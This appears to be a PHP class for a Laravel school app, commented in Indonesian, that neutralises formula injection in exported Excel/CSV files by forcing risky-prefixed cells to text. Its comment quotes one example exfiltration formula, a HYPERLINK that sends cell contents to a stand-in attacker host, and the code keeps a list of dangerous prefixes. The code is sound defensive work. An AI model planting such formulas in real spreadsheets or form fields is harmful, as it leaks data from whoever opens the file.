<?php

namespace App\Support\Excel;

use Maatwebsite\Excel\DefaultValueBinder;
use PhpOffice\PhpSpreadsheet\Cell\Cell;
use PhpOffice\PhpSpreadsheet\Cell\DataType;

/**
 * Menutup injeksi rumus pada berkas Excel/CSV yang diekspor.
 *
 * Excel dan LibreOffice memperlakukan sel yang isinya diawali `=` `+` `-` `@`
 * sebagai RUMUS, bukan teks. Pengikat bawaan meneruskan begitu saja, sehingga
 * teks yang diketik orang lain bisa berubah menjadi kode yang berjalan di
 * komputer orang yang membuka berkasnya.
 *
 * Yang membuatnya serius di aplikasi ini: penyerangnya tidak perlu punya akun.
 * Formulir biodata dan refleksi terbuka untuk siapa pun yang memegang tautan,
 * dan isinya — hobi, cita-cita, nama ayah, pesan untuk orang tua — masuk apa
 * adanya ke kolom ekspor. Satu orang tua mengetik
 *
 *     =HYPERLINK("http://penyerang.tld/?d="&A1,"Klik di sini")
 *
 * pada kolom Hobi, lalu wali kelas mengunduh dan membuka rekap kelasnya. Yang
 * dieksekusi berjalan di komputer wali kelas, dengan berkas yang ia percaya
 * karena ia sendiri yang mencetaknya.
 *
 * Hanya string berawalan karakter berbahaya yang dipaksa jadi teks; angka,
 * tanggal, dan nominal tetap ditangani pengikat bawaan supaya format kolom di
 * StudentsExport dan CashBookReportExport tidak rusak.
 */
class PengikatNilaiAman extends DefaultValueBinder
{
    /**
     * Termasuk TAB dan CR: keduanya dipakai untuk menyelundupkan rumus melewati
     * pemeriksaan yang cuma melihat karakter pertama yang tampak.
     */
    private const AWALAN_BERBAHAYA = ['=', '+', '-', '@', "\t", "\r"];

    public function bindValue(Cell $cell, mixed $value): bool
    {
        if (is_string($value) && $value !== '' && in_array($value[0], self::AWALAN_BERBAHAYA, true)) {
            $cell->setValueExplicit($value, DataType::TYPE_STRING);

            return true;
        }

        return parent::bindValue($cell, $value);
    }
}
